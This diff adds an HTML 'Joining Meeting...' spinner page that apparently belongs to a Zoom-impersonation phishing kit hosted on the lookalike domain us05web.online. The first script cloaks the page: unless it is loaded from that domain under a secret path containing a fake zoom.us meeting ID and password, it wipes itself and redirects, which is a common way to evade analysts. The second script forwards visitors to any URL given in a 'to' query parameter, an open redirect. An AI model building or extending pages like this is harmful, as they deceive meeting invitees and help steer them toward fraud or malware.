@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en-US" translate="no">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="google" content="notranslate">
+<title>Joining Meeting...</title>
+<script>
+  (function() {
+    var allowedHosts = ['us05web.online', 'www.us05web.online'];
+    var secretPath = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/';
+    var isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    
+    // If not localhost AND (wrong domain OR wrong folder), wipe the page.
+    if (!isLocal) {
+      if (!allowedHosts.includes(window.location.hostname) || 
+          window.location.pathname.indexOf(secretPath) !== 0) {
+        document.documentElement.innerHTML = '';
+        window.location.href = 'https://us05web.online';
+      }
+    }
+  })();
+</script>
+
+<style>
+* { box-sizing: border-box; }
+html, body { height: 100%; margin: 0; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background: #262626;
+}
+#joinSpinner {
+  position: fixed; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+  flex-direction: column; gap: 24px;
+  background: #262626;
+}
+#joinSpinner .spinner {
+  width: 64px; height: 64px; border-radius: 50%;
+  border: 5px solid #fff; border-top-color: #4a90e2;
+  animation: joinspin 1s linear infinite;
+}
+#joinSpinner .label { color: #f5f5f5; font-size: 24px; font-weight: 400; }
+@keyframes joinspin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+<div id="joinSpinner">
+  <div class="spinner"></div>
+  <div class="label">Joining Meeting...</div>
+</div>
+
+<!-- lang.js handles the "spinText" translation -->
+<script src="../lang.js"></script>
+
+<script>
+(function () {
+  'use strict';
+
+  // ============================================================
+  //  ★ CONFIG
+  // ============================================================
+    // Read destination + duration from the query string.
+  // Defaults preserve the original 1s → meeting/index.html behaviour.
+  var _qs              = new URLSearchParams(window.location.search);
+  var MEETING_PAGE_URL = _qs.get('to') || '../meeting/index.html';
+  var SPINNER_MS       = parseInt(_qs.get('ms'), 10) || 1000;
+
+  // Apply the saved language to the spinner label immediately.
+  var savedLang = 'en-US';
+  try { savedLang = localStorage.getItem('zoom.lang') || 'en-US'; } catch (e) {}
+  if (window.zoomApplyLanguage) window.zoomApplyLanguage(savedLang);
+
+  // ============================================================
+  // Hand off to the meeting page.
+  // We use location.replace() so this spinner page is REMOVED
+  // from browser history — pressing Back from the meeting room
+  // goes straight back to the preview page.
+  // ============================================================
+  setTimeout(function () {
+    window.location.replace(MEETING_PAGE_URL);
+  }, SPINNER_MS);
+
+})();
+</script>
+</body>
+</html>
